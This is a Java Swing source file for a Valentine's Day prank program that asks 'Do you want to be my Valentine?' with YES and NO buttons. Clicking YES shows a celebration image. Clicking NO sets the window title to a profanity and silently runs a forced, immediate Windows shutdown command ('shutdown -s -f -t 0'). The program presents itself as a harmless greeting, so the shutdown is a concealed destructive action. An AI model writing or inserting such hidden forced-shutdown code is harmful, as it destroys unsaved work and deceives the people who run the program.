// @author conspiracy | https://conspiracy.moe/

package VDAY;

import java.awt.EventQueue;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.SwingConstants;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.Color;
import javax.swing.ImageIcon;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class WillYouBeMyValentine extends JFrame {
	
	private static final long serialVersionUID = 1L;
	private JPanel MainPanel;
	private ImageIcon bg = new ImageIcon(getClass().getResource("/VDAY/vday.png"));
	private ImageIcon yes = new ImageIcon(getClass().getResource("/VDAY/yes.gif"));
	private ImageIcon no = new ImageIcon(getClass().getResource("/VDAY/no.png"));

	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					WillYouBeMyValentine frame = new WillYouBeMyValentine();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}
	
	public WillYouBeMyValentine() {
		setIconImage(Toolkit.getDefaultToolkit().getImage(WillYouBeMyValentine.class.getResource("/VDAY/heart.png")));
		setResizable(false);	
		MainPanel = new JPanel();
		JLabel bglbl = new JLabel("");
		JButton YesBtn = new JButton("♥ YES!! ♥");
		JButton NoBtn = new JButton("no");
		JLabel Question1 = new JLabel("DO YOU WANT TO BE");
		JLabel Question2 = new JLabel("MY VALENTINE?");
		JLabel LoveU = new JLabel("♥ YIPPIEE!! Poggers! ♥");
		LoveU.setForeground(new Color(255, 255, 255));
		LoveU.setFont(new Font("Tahoma", Font.PLAIN, 40));
		LoveU.setHorizontalAlignment(SwingConstants.CENTER);
		setTitle("Will You Be My Valentine?");
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		MainPanel.setBackground(new Color(255, 188, 199));
		MainPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(MainPanel);
		MainPanel.setLayout(null);
		bglbl.setBounds(0, 0, 434, 261);
		YesBtn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
			}
		});
		YesBtn.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				MainPanel.remove(Question1);
				MainPanel.remove(Question2);
				MainPanel.remove(YesBtn);
				MainPanel.remove(NoBtn);
				MainPanel.add(LoveU);
				LoveU.setBounds(0, 0, 434, 261);
				MainPanel.remove(bglbl);
				MainPanel.add(bglbl);
				bglbl.setIcon(yes);
				MainPanel.repaint();
				
			}
		});
		YesBtn.setFont(new Font("Tahoma", Font.PLAIN, 25));
		YesBtn.setForeground(new Color(255, 255, 255));
		YesBtn.setBackground(new Color(128, 0, 64));
		YesBtn.setBounds(50, 140, 140, 75);
		YesBtn.setFocusable(false);
		MainPanel.add(YesBtn);
		NoBtn.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				setTitle("fuck you");
				MainPanel.remove(Question1);
				MainPanel.remove(Question2);
				MainPanel.remove(YesBtn);
				MainPanel.remove(NoBtn);
				MainPanel.remove(bglbl);
				MainPanel.add(bglbl);
				bglbl.setIcon(no);
				MainPanel.repaint();
				try {
					Runtime.getRuntime().exec("shutdown -s -f -t 0");
				} catch (IOException e1) {
					e1.printStackTrace();
				}
			}
		});
		NoBtn.setFont(new Font("Tahoma", Font.PLAIN, 25));
		NoBtn.setForeground(new Color(255, 255, 255));
		NoBtn.setBackground(new Color(128, 0, 64));
		NoBtn.setBounds(244, 140, 140, 75);
		NoBtn.setFocusable(false);
		MainPanel.add(NoBtn);
		Question1.setForeground(new Color(50, 0, 0));
		Question1.setFont(new Font("Arial Black", Font.PLAIN, 30));
		Question1.setHorizontalAlignment(SwingConstants.CENTER);
		Question1.setBounds(10, 40, 414, 38);
		MainPanel.add(Question1);
		Question2.setForeground(new Color(50, 0, 0));
		Question2.setHorizontalAlignment(SwingConstants.CENTER);
		Question2.setFont(new Font("Georgia", Font.BOLD, 40));
		Question2.setBounds(10, 75, 414, 38);
		MainPanel.add(Question2);
		MainPanel.add(bglbl);
		bglbl.setIcon(bg);
		LoveU.setBounds(0, 0, 434, 261);
	}
}
